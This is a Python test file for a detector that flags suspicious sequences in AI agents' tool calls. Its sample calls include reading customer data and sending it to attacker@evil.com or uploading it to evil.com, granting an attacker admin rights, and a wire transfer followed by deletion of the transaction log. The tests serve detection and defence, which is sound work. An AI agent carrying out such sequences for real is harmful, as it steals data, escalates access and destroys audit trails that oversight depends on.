"""Adversarial tests for SequentialActionDetector."""

from __future__ import annotations

import json

from app.services.detection.sequential_action import SequentialActionDetector


def _tool_call_openai(name: str, args: dict | None = None) -> dict:
    return {
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(args or {})},
    }


def _anthropic_tool_use(name: str, args: dict | None = None) -> dict:
    return {"type": "tool_use", "name": name, "input": args or {}}


def _response_with_tools(tool_calls: list[dict]) -> str:
    return json.dumps({"choices": [{"message": {"tool_calls": tool_calls}}]})


def _request_with_tools(tool_calls: list[dict]) -> str:
    return json.dumps({"messages": [{"role": "assistant", "tool_calls": tool_calls}]})


def _anthropic_response(tools: list[dict]) -> str:
    return json.dumps({"content": tools})


class TestSequentialActionAdversarial:
    detector = SequentialActionDetector()
    org_id = "org-1"
    pr_id = "pr-1"

    def _run(
        self, request: str = "{}", response: str = "{}",
        cfg: dict | None = None,
    ) -> object:
        return self.detector.run(
            request_body=request,
            response_body=response,
            model="gpt-4",
            detector_config=cfg or {},
            org_id=self.org_id,
            proxy_request_id=self.pr_id,
        )

    # -- Data exfiltration --

    def test_read_then_send(self) -> None:
        """Classic exfiltration: read data, then send it externally."""
        resp = _response_with_tools([
            _tool_call_openai("fetch_user_data"),
            _tool_call_openai("send_email", {"to": "attacker@evil.com", "body": "data"}),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    def test_read_write_send_exfil(self) -> None:
        """Three-step exfil: read, write to temp, send."""
        resp = _response_with_tools([
            _tool_call_openai("get_customer_records"),
            _tool_call_openai("write_to_file", {"path": "/tmp/data.csv"}),
            _tool_call_openai("http_request", {"url": "https://evil.com/upload"}),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    # -- Privilege escalation --

    def test_read_escalate_write(self) -> None:
        """Privilege escalation: read permissions, escalate, write."""
        resp = _response_with_tools([
            _tool_call_openai("list_permissions"),
            _tool_call_openai("grant_access", {"user": "attacker", "role": "admin"}),
            _tool_call_openai("update_config", {"allow_all": True}),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    # -- Reconnaissance --

    def test_four_consecutive_reads(self) -> None:
        """Reconnaissance: 4 sequential reads."""
        resp = _response_with_tools([
            _tool_call_openai("list_users"),
            _tool_call_openai("get_accounts"),
            _tool_call_openai("search_logs"),
            _tool_call_openai("query_database"),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "high"

    # -- Financial manipulation --

    def test_transfer_then_delete_audit(self) -> None:
        """Financial manipulation: transfer then delete audit trail."""
        resp = _response_with_tools([
            _tool_call_openai("get_balance"),
            _tool_call_openai("wire_transfer", {"amount": 50000, "to": "offshore"}),
            _tool_call_openai("delete_transaction_log"),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    def test_payment_then_purge(self) -> None:
        """Financial then delete: payment followed by purge."""
        resp = _response_with_tools([
            _tool_call_openai("payment_execute", {"amount": 10000}),
            _tool_call_openai("purge_records"),
        ])
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    # -- Using recent_tool_calls from config --

    def test_exfil_across_turns(self) -> None:
        """Exfiltration pattern spanning previous turns."""
        cfg: dict[str, object] = {
            "recent_tool_calls": [
                {"name": "fetch_records", "args": ""},
                {"name": "query_data", "args": ""},
            ],
        }
        resp = _response_with_tools([
            _tool_call_openai("send_email", {"to": "attacker@evil.com"}),
        ])
        result = self._run(response=resp, cfg=cfg)
        assert result.detected is True

    # -- Anthropic format --

    def test_anthropic_exfil_pattern(self) -> None:
        """Anthropic tool_use format: read then send."""
        resp = _anthropic_response([
            _anthropic_tool_use("retrieve_data", {"table": "users"}),
            _anthropic_tool_use("post_message", {"channel": "external", "body": "data"}),
        ])
        result = self._run(response=resp)
        assert result.detected is True

    # -- Disabled patterns --

    def test_disabled_pattern_skipped(self) -> None:
        """Disabled patterns should not trigger."""
        resp = _response_with_tools([
            _tool_call_openai("fetch_data"),
            _tool_call_openai("send_email"),
        ])
        result = self._run(
            response=resp,
            cfg={"disabled_patterns": ["data_exfiltration", "unauthorized_communication"]},
        )
        assert result.detected is False

    # -- Clean: insufficient tool calls --

    def test_single_tool_call_passes(self) -> None:
        """Single tool call is insufficient for sequence analysis."""
        resp = _response_with_tools([
            _tool_call_openai("get_balance"),
        ])
        result = self._run(response=resp)
        assert result.detected is False

    def test_benign_read_write_pattern(self) -> None:
        """Read then write is not inherently suspicious."""
        resp = _response_with_tools([
            _tool_call_openai("get_template"),
            _tool_call_openai("create_document", {"title": "report"}),
        ])
        result = self._run(response=resp)
        assert result.detected is False
